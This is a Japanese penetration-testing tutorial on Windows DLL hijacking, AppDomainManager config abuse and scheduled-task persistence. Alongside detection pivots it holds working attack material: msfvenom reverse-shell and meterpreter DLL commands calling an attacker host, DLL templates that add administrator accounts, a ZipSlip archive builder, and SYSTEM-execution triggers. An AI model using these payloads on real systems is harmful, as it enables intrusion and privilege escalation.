# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking では、信頼されたアプリケーションを操作して悪意のある DLL をロードさせます。この用語には、**DLL Spoofing、Injection、Side-Loading** などの複数の手法が含まれます。主にコード実行や永続化の実現に利用され、Privilege Escalation に使われることは比較的少数です。ここでは Privilege Escalation に焦点を当てていますが、Hijacking の手法自体は目的にかかわらず同じです。

### 一般的な手法

DLL Hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL ロード戦略によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のある DLL に置き換えます。必要に応じて DLL Proxying を使用し、元の DLL の機能を維持します。
2. **DLL Search Order Hijacking**: アプリケーションの検索パターンを悪用し、正規の DLL よりも先に検索されるパスへ悪意のある DLL を配置します。
3. **Phantom DLL Hijacking**: 存在しない必要な DLL だとアプリケーションに思わせ、ロードさせるための悪意のある DLL を作成します。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメーターを変更し、アプリケーションを悪意のある DLL へ誘導します。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換えます。この手法は DLL side-loading と関連付けられることが多くあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリへ悪意のある DLL を配置します。これは Binary Proxy Execution techniques に類似しています。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading だけが、信頼された **.NET Framework** プロセスに attacker code をロードさせる方法ではありません。対象の実行ファイルが **managed** アプリケーションの場合、CLR は実行ファイル名に基づく **application configuration file**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタム **AppDomainManager** を定義できます。設定ファイルが EXE と同じ場所に配置された attacker-controlled assembly を指定している場合、CLR はアプリケーションの通常のコードパスより**前に**それをロードし、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework configuration schema によると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在している必要があります。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小限のマネージャー:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践的な注意点:
- これは **.NET Framework specific** の tradecraft です。Win32 DLL search order ではなく、CLR config parsing に依存します。
- ホストは実際に **managed EXE** でなければなりません。簡易 triage には、`sigcheck -m target.exe`、`corflags target.exe`、または PE metadata 内の **CLR Runtime Header** の確認を使用します。
- config filename は executable name と完全に一致し（`<binary>.config`）、通常は **EXE の隣**に配置されます。
- これは **signed Microsoft/vendor binaries** に対して有効です。trusted EXE を変更せず、malicious managed assembly を in-process で実行できるためです。
- すでに writable installer/update directory がある場合、AppDomainManager hijacking を **first stage** として使用し、その後の stage で classic DLL sideloading または reflective loading を実行できます。

### downloader + scheduled-task bootstrap としての AppDomainManager

実用的な intrusion pattern では、trusted managed EXE と malicious `*.config`、および **small bootstrapper** としてのみ機能する malicious AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. User が、`%USERPROFILE%\Downloads` のようなもっともらしい location から signed .NET installer または updater を起動します。
2. 隣接する config により、legitimate app logic の開始 **前**に CLR が attacker assembly を load します。
3. Malicious manager が **path gate** を実行します（たとえば、host EXE が `Downloads` から実行されている場合のみ続行し、second stage は `%LOCALAPPDATA%` からのみ実行します）。
4. Check に pass すると、`%LOCALAPPDATA%\PerfWatson2.exe` のような user-writable path に real payload を download し、scheduled task によって persistence を install します。

この variant が重要な理由:
- Signed host EXE は変更されないため、main binary の hash のみを確認する triage では compromise を見逃す可能性があります。
- 単純な **path-based anti-analysis** は一般的です。ZIP/EXE/DLL の triad を Desktop、Temp、または sandbox path に移動すると、意図的に chain を壊せます。
- First-stage AppDomainManager DLL は小さく low-noise のままにでき、real implant は後から fetch できます。

この pattern で頻繁に見られる minimal persistence example:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` は、その user/session で**利用可能な最高レベル**を意味します。これだけで SYSTEM への escalation が保証されるわけではありません。
- この technique は、classic な missing-DLL search-order hijacking というより、**.NET config abuse による execution/persistence**として分類する方が適切な場合が多くあります。ただし、operators は両方を chain することがよくあります。

Detection pivots:
- **ZIP extraction paths**、`Downloads`、`%TEMP%`、その他の user-writable folders から起動された Signed .NET executables で、**colocated** な `<exe>.config` を伴うもの。
- `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` 内を指す action を持ち、browser/vendor updaters を装う名前の新しい scheduled tasks。
- 別の EXE を直ちに download してから `schtasks.exe` を spawn する、短時間だけ存在する managed bootstrap processes。
- executable path が想定された user-profile directory と一致しない限り早期終了する samples。

### 既存の scheduled task を hijack して sideload chain を再起動する

persistence の場合、**creating a new task** だけを探してはいけません。一部の intrusion sets は、正規の installer が**normal updater task**を作成するまで待機し、その後 **rewrite the task action** を行います。これにより、既存の name、author、trigger は defenders にとって見慣れたままになります。

Reusable workflow:
1. 正規の software を install/run し、通常作成される task を特定します。
2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を記録します。<sup>[[23]](#references)</sup>
3. action のみを置き換え、task が user-writable staging directory にある **trusted host EXE** を起動するようにします。この EXE が real payload を side-load または AppDomain-load します。
4. 新たな明らかな persistence artifact を作成するのではなく、同じ task name で再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
なぜより stealthy なのか:
- task name は、正規のものに見せかけられる（例: vendor updater）。
- **Task Scheduler service** が起動するため、parent/ancestor validation では、`explorer.exe` ではなく期待される scheduling chain が検出されることが多い。
- **new task names** だけを調査する DFIR teams は、registration は既存のままでも、action が `%LOCALAPPDATA%`、`%APPDATA%`、またはその他の attacker-controlled path を指すように変更された task を見逃す可能性がある。

素早い hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata を baseline と比較する。
- **vendor-looking updater task** が **user-writable directories** から実行される、または隣接する `*.config` file を持つ .NET EXE を起動する場合に alert を出す。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に組み合わせた step-by-step chain については、以下の workflow を確認してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 欠落している DLL の検出

system 内に存在しない Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**以下の 2 つの filters を設定**することです:

![一般的な Techniques - 欠落している Dlls の検出: system 内に存在しない Dlls を見つける最も一般的な方法は、sysinternals の procmon を実行し、以下の 2 つの filters を設定することです](<../../../images/image (961).png>)

![一般的な Techniques - 欠落している Dlls の検出: system 内に存在しない Dlls を見つける最も一般的な方法は、sysinternals の procmon を実行し、以下の 2 つの filters を設定することです](<../../../images/image (230).png>)

そして **File System Activity** だけを表示します:

![一般的な Techniques - 欠落している Dlls の検出: File System Activity だけを表示することです](<../../../images/image (153).png>)

**missing dlls in general** を探している場合は、これを数 **seconds** 実行したままにします。\
**specific executable 内の missing DLL** を探している場合は、**"Process Name" "contains" `<exec name>`** などの別の filter を設定し、実行してから、events の capture を停止します。<sup>[[9]](#references)</sup>

## Missing DLLs の Exploiting

privileges を escalate するには、privileged process が、あなたが write 可能な location から load しようとする **DLL** を探します。これは、legitimate DLL を含む directory よりも前に検索される directory を control している場合、または要求された DLL が存在せず、検索対象の directory のいずれかに write 可能な場合に発生します。

### Dll Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **内では、Dlls が具体的にどのように load されるかを確認できます。**

**Windows applications** は、**pre-defined search paths** のセットを、特定の順序に従って DLLs を探します。DLL hijacking の問題は、malicious DLL がこれらの directory のいずれかに戦略的に配置され、authentic DLL より先に load されることで発生します。これを防ぐ方法は、application が必要とする DLLs を参照する際に absolute paths を使用するようにすることです。

**32-bit** systems の **DLL search order** は以下のとおりです:

1. application が load された directory。
2. system directory。[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使用して、この directory の path を取得します。(_C:\Windows\System32_)
3. 16-bit system directory。この directory の path を取得する function はありませんが、検索されます。(_C:\Windows\System_)
4. Windows directory。[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使用して、この directory の path を取得します。
1. (_C:\Windows_)
5. current directory。
6. PATH environment variable に指定されている directories。これには、**App Paths** registry key で指定された per-application path が含まれない点に注意してください。DLL search path の計算時に **App Paths** key は使用されません。

これは **SafeDllSearchMode** が有効な場合の **default** search order です。無効にすると current directory は 2 番目に移動します。この feature を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに call された場合、search は **LoadLibraryEx** が load している executable module の directory から開始されます。

最後に、DLL は name ではなく absolute path で load できます。その場合、Windows は DLL 自体についてはその path だけを確認しますが、name で要求された dependencies は引き続き該当する search order に従います。

search order を変更する別の方法もありますが、ここでは説明しません。

### 任意の file write を missing-DLL hijack につなげる

1. **ProcMon** filters（`Process Name` = target EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使用して、process が probe したものの見つけられなかった DLL names を収集します。<sup>[[14]](#references)</sup>
2. binary が **schedule/service** 上で実行される場合、これらの names のいずれかを持つ DLL を **application directory**（search-order entry #1）に配置すると、次回の execution 時に load されます。ある .NET scanner の case では、process は `C:\samples\app\` 内の `hostfxr.dll` を、`C:\Program Files\dotnet\fxr\...` から real copy を load する前に探していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を build します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. primitive が **ZipSlip-style arbitrary write** の場合、extraction dir から escape する entry を含む ZIP を作成し、DLL が app folder に配置されるようにします:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. アーカイブを監視対象の inbox/share に配置します。scheduled task がプロセスを再起動すると、malicious DLL がロードされ、service account としてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介して sideloading を強制する

新しく作成するプロセスの DLL search path に確実に影響を与える高度な方法は、ntdll の native APIs を使用してプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに attacker-controlled directory を指定すると、import された DLL を名前で解決する対象プロセス（absolute path を使用せず、安全な loading flags も使用しない場合）に対して、そのディレクトリから malicious DLL をロードさせることができます。

Key idea
- RtlCreateProcessParametersEx を使用して process parameters を構築し、controlled folder（例：dropper/unpacker が存在するディレクトリ）を指す custom DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。対象 binary が DLL を名前で解決すると、loader は解決時に指定された DllPath を参照するため、malicious DLL が対象 EXE と同じ場所に存在しない場合でも、信頼性の高い sideloading が可能になります。

Notes/limitations
- これは作成される child process に影響します。current process のみに影響する SetDllDirectory とは異なります。
- 対象は DLL を名前で import または LoadLibrary する必要があります（absolute path を使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用しないこと）。
- KnownDLLs と hardcoded absolute paths は hijack できません。Forwarded exports と SxS によって優先順位が変わる場合があります。

Minimal C example（ntdll、wide strings、簡略化した error handling）:

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath を介して DLL sideloading を強制する</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用上の使用例
- 必要な関数を export する、または実際の DLL へ proxy する悪意のある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の手法を使用して、名前で xmllite.dll を検索することが知られている署名済みバイナリを起動します。loader は指定された DllPath 経由で import を解決し、DLL を sideload します。

この technique は、実環境で複数段階の sideloading chain を実行するために使用されていることが確認されています。最初の launcher が helper DLL をドロップし、その DLL がカスタム DllPath を指定して、攻撃者の DLL を staging directory から強制的にロードする、hijack 可能な Microsoft 署名済みバイナリを起動します。<sup>[[6]](#references)</sup>


### `.exe.config` を介した .NET AppDomainManager hijacking

**.NET Framework** の target では、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、memory を patch せずに **`Main()`** より前に sideloading を実行できます。Win32 DLL search order のみに依存するのではなく、攻撃者は正規の .NET EXE を、悪意のある config および 1 つ以上の攻撃者が制御する assembly と同じ場所に配置します。

chain の動作:<sup>[[15]](#references)[[22]](#references)</sup>
1. host EXE が起動し、**CLR が `<exe>.config` を読み取ります**。
2. config が **`<appDomainManagerAssembly>`** および **`<appDomainManagerType>`** を設定し、runtime が攻撃者の制御する `AppDomainManager` を instantiate するようにします。
3. 悪意のある manager が、trusted host process 内で **`Main()` より前の実行**を取得します。
4. 同じ config によって、CLR が local assembly を優先して resolve するよう強制できます（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）。また、inline patching を行わずに runtime validation や telemetry を弱めることもできます。

Campaign 形式の pattern（directive / CLR version によって正確な nesting は異なる場合があります）:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
有用な理由:
- **`<probing privatePath="."/>`** は assembly resolution を application directory 内に限定し、folder を予測可能な sideloading surface にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は、正規の app logic が実行される前の CLR initialization 中に、execution を attacker code へ移します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust app が strong-name validation failure を起こさずに unsigned または改ざんされた assemblies を load できる場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、より新しい assemblies への publisher-policy redirects を回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は runtime selection をより deterministic にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に興味深いものです。これは implant が memory 内で `EtwEventWrite` を patch するのではなく、configuration から **CLR 自身の ETW visibility を無効化**するためです。

最近の campaigns で見られる operational pattern:
- Stage 1 で `setup.exe`、`setup.exe.config`、および local assemblies を配置します。
- Stage 2 でそれらをもっともらしい **AppData update** folder にコピーし、host の名前を `update.exe` のようなものへ変更して、**scheduled task** 経由で再起動します。
- Stage 3 で、final RAT DLL/export を load する前に execution context（例: Task Scheduler から想定される parent `svchost.exe`）を検証します。

Hunting のアイデア:
- user-writable locations で、不審な隣接 **`.config`** files とともに実行される、signed またはその他の理由で正規の **.NET executables**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` files。
- **`%LOCALAPPDATA%`** または app-specific な `\bin\update\` directories から renamed update binaries を再起動する scheduled tasks。
- scheduled task が trusted .NET host を起動し、その host が直ちに自身の directory から non-vendor assemblies を load する parent/child chains。

#### Windows docs における DLL search order の例外

Windows documentation では、standard DLL search order に対する特定の例外が示されています。

- **memory にすでに load されている DLL と同じ名前を持つ DLL** が検出された場合、system は通常の search を bypass します。代わりに、DLL を memory 内ですでに load されているものに default する前に、redirection と manifest の check を実行します。**この scenario では、system は DLL の search を実行しません**。
- DLL が現在の Windows version における **known DLL** として認識される場合、system はその known DLL の version と、その dependent DLLs を **search process を行わずに**使用します。registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの known DLLs の list が保存されています。
- **DLL に dependencies がある**場合、これらの dependent DLLs の search は、最初の DLL が full path によって識別されたかどうかにかかわらず、**module names** のみで指定されたものとして実行されます。

### Privileges の Escalating

**Requirements**:

- **different privileges**（horizontal または lateral movement）で operate している、または operate する process で、**DLL が不足している**ものを特定する。
- **DLL** が **searched for** される **directory** のいずれかに、**write access** があることを確認する。この location は executable の directory、または system path 内の directory である可能性があります。

これらの prerequisites は default では uncommon です。privileged executables に DLL dependencies が不足していることは通常なく、standard users は通常、system search-path directories に write できません。それでも、misconfigured environments では両方の conditions が露出する可能性があります。\
requirements を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME) project を確認してください。主な goal は UAC bypass ですが、特定の Windows versions 向けの DLL-hijacking PoCs が含まれており、見つけた writable directory に合わせて適応できることがよくあります。

次のコマンドを実行して **folder 内の permissions を check できる**ことに注意してください。<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH 内のすべてのフォルダーの権限を確認します**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次の方法でも、実行ファイルの imports と dll の exports を確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**System Path folder**への書き込み権限を利用して**DLL Hijackingで権限昇格する方法**の完全なガイドは、以下を確認してください。


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内のいずれかのフォルダに対する書き込み権限があるかを確認します。\
この脆弱性を発見するために使用できるその他の興味深い自動化ツールは、**PowerSploit functions**の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ です。

### 例

悪用可能な状況を発見した場合、それを正常に悪用するために最も重要なことの1つは、**実行ファイルがインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。ただし、DLL Hijackingは、Medium Integrity levelからHigh **(UACをバイパス)**へ、または[ **High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)**権限昇格**する際に役立つことに注意してください。実行用のDLL hijackingに焦点を当てたこのDLL hijackingの解説では、**有効なdllの作成方法**の例を確認できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**では、**テンプレート**として使用したり、**必要ではない関数をエクスポートするdll**を作成したりする際に役立つ、**基本的なdllコード**を紹介します。

## **DLLの作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy**とは、**ロード時に悪意のあるコードを実行できる**だけでなく、**実際のライブラリにすべての呼び出しを中継することで**、**公開**および**期待どおりに動作**できるDLLです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実際に**実行ファイルを指定してproxifyしたいライブラリを選択し、proxified dllを生成**したり、**DLLを指定してproxified dllを生成**したりできます。

### **Meterpreter**

**rev shellを取得 (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86)を取得:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成（x86、x64版は見つけられませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で作成したもの

多くの場合、コンパイルする DLL は、**被害プロセスが import するすべての関数を export する必要があります**。必要な export が欠けていると、バイナリでその関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を含む C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ別の C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack（Accessibility/ATs）

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き検索するため、任意コード実行および永続化を目的として hijack できます。<sup>[[7]](#references)</sup>

主な事実
- Probe path（current builds）: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`（EN-US）。
- Legacy path（older builds）: `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に writable な attacker-controlled DLL が存在する場合、それがロードされ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。Exports は不要です。

Procmon を使用した Discovery
- Filter: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記 path の load 試行を確認します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC の静粛化
- 素朴な hijack は UI 上で発話または強調表示を行います。静かに動作させるには、attach 時に Narrator のスレッドを列挙し、メインスレッドを `OpenThread(THREAD_SUSPEND_RESUME)` で開いて `SuspendThread` します。その後、自身のスレッドで処理を続行します。完全なコードについては PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility 設定による Trigger と persistence
- ユーザーコンテキスト (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記を設定すると、Narrator の起動時に配置した DLL がロードされます。Secure Desktop (ログオン画面) で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が Secure Desktop 上で SYSTEM として実行されます。

RDP による SYSTEM 実行の Trigger (lateral movement)
- classic RDP security layer を許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストへ RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が Secure Desktop 上で SYSTEM として実行されます。
- RDP セッションを閉じると実行は停止します。速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) のレジストリエントリ (例: CursorIndicator) を clone し、任意の binary/DLL を指すよう編集して import した後、`configuration` をその AT 名に設定できます。これにより、Accessibility framework の下で任意の実行を proxy できます。

Notes
- `%windir%\System32` 配下への書き込みと HKLM の値の変更には admin 権限が必要です。
- すべての payload ロジックは `DLL_PROCESS_ATTACH` に配置できます。exports は不要です。

## Case Study: CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation

この case では、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を示します。これは **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は毎日午前 9:30 に、ログオン中のユーザーのコンテキストで実行されます。
- **Directory Permissions**: `CREATOR OWNER` による書き込みが可能で、local users が任意のファイルを配置できます。
- **DLL Search Behavior**: 最初に working directory から `hostfxr.dll` のロードを試み、見つからない場合は "NAME NOT FOUND" をログに記録します。これは local directory search precedence を示しています。

### Exploit Implementation

